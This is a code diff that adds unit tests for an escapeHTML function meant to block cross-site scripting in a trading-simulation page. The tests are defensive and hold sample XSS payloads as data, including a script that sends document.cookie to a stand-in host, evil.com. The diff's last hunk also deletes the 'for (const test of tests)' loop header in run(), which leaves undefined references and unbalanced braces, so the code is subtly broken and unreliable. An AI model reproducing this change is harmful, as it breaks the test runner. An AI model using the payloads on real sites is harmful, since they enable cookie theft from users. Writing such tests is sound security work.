@@ -730,10 +730,146 @@ describe("Performance", () => {
   });
 });
 
+// ─────────────────────────────────────────────────────────
+// escapeHTML is defined inside index.html as a browser script
+// and is not a Node module, so we replicate the implementation
+// here to enable unit-testing without a browser environment.
+// Keep this definition in sync with index.html:1304-1312.
+// ─────────────────────────────────────────────────────────
+const escapeHTML = (str) => {
+  if (!str) return '';
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#039;');
+};
+
+describe("escapeHTML - XSS Prevention (index.html:1304)", () => {
+  // ── Falsy / edge input ──────────────────────────────────
+  it("returns empty string for null", () => {
+    expect(escapeHTML(null)).toBe('');
+  });
+
+  it("returns empty string for undefined", () => {
+    expect(escapeHTML(undefined)).toBe('');
+  });
+
+  it("returns empty string for empty string", () => {
+    expect(escapeHTML('')).toBe('');
+  });
+
+  it("returns empty string for 0 (falsy number)", () => {
+    expect(escapeHTML(0)).toBe('');
+  });
+
+  it("returns empty string for false", () => {
+    expect(escapeHTML(false)).toBe('');
+  });
+
+  // ── Plain / safe input passes through unchanged ─────────
+  it("passes plain ASCII text through unchanged", () => {
+    expect(escapeHTML('BULL')).toBe('BULL');
+  });
+
+  it("passes alphanumeric mode string through unchanged", () => {
+    expect(escapeHTML('HIGH_VOL')).toBe('HIGH_VOL');
+  });
+
+  // ── Individual character escaping ───────────────────────
+  it("escapes & to &amp;", () => {
+    expect(escapeHTML('AT&T')).toBe('AT&amp;T');
+  });
+
+  it("escapes < to &lt;", () => {
+    expect(escapeHTML('a<b')).toBe('a&lt;b');
+  });
+
+  it("escapes > to &gt;", () => {
+    expect(escapeHTML('a>b')).toBe('a&gt;b');
+  });
+
+  it("escapes \" to &quot;", () => {
+    expect(escapeHTML('say "hi"')).toBe('say &quot;hi&quot;');
+  });
+
+  it("escapes ' to &#039;", () => {
+    expect(escapeHTML("it's")).toBe('it&#039;s');
+  });
+
+  // ── XSS payloads ────────────────────────────────────────
+  it("escapes a basic <script> XSS payload", () => {
+    const payload = '<script>alert(1)</script>';
+    const result = escapeHTML(payload);
+    expect(result).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
+  });
+
+  it("does not contain a raw < after escaping a script tag", () => {
+    const result = escapeHTML('<script>alert("xss")</script>');
+    expect(result.includes('<')).toBe(false);
+  });
+
+  it("escapes attribute-injection payload with double quotes", () => {
+    const payload = '" onmouseover="alert(1)';
+    const result = escapeHTML(payload);
+    expect(result).toBe('&quot; onmouseover=&quot;alert(1)');
+  });
+
+  it("escapes attribute-injection payload with single quotes", () => {
+    const payload = "' onload='alert(1)";
+    const result = escapeHTML(payload);
+    expect(result).toBe('&#039; onload=&#039;alert(1)');
+  });
+
+  it("escapes img onerror XSS payload", () => {
+    const payload = '<img src=x onerror=alert(1)>';
+    const result = escapeHTML(payload);
+    expect(result).toBe('&lt;img src=x onerror=alert(1)&gt;');
+  });
+
+  it("escapes a payload with all five special characters", () => {
+    const payload = '<a href="test" onclick=\'alert(1 & 2)\'>';
+    const result = escapeHTML(payload);
+    expect(result).toBe('&lt;a href=&quot;test&quot; onclick=&#039;alert(1 &amp; 2)&#039;&gt;');
+  });
+
+  // ── Non-string input coercion ────────────────────────────
+  it("converts a truthy number to its string representation", () => {
+    expect(escapeHTML(42)).toBe('42');
+  });
+
+  it("converts an object with toString to a string", () => {
+    const obj = { toString: () => '<BULL>' };
+    expect(escapeHTML(obj)).toBe('&lt;BULL&gt;');
+  });
+
+  // ── Regression: results.mode field from showCrucibleResults ──
+  it("REGRESSION: results.mode with XSS payload is safe for innerHTML", () => {
+    // Simulates the exact scenario fixed by the PR: a user-influenced
+    // results.mode reaching the Crucible modal innerHTML template.
+    const maliciousMode = '<script>fetch("https://evil.com?c="+document.cookie)</script>';
+    const escaped = escapeHTML(maliciousMode);
+    // Must not contain any raw angle brackets that would be parsed as tags
+    expect(escaped.includes('<')).toBe(false);
+    expect(escaped.includes('>')).toBe(false);
+    expect(escaped).toContain('&lt;script&gt;');
+  });
+
+  it("REGRESSION: benign mode strings are preserved exactly after escaping", () => {
+    // Verifies that the fix does not corrupt legitimate mode values
+    // such as those returned by simulateCrucibleV2Results.
+    const modes = ['BULL', 'BEAR', 'CHOP', 'HIGH_VOL', 'STRESS_1_5X'];
+    for (const mode of modes) {
+      expect(escapeHTML(mode)).toBe(mode);
+    }
+  });
+});
+
 async function run() {
   let lastSuite = null;
 
-  for (const test of tests) {
+
     if (test.suite !== lastSuite) {
       lastSuite = test.suite;
       console.log(`\n📋 ${lastSuite}`);
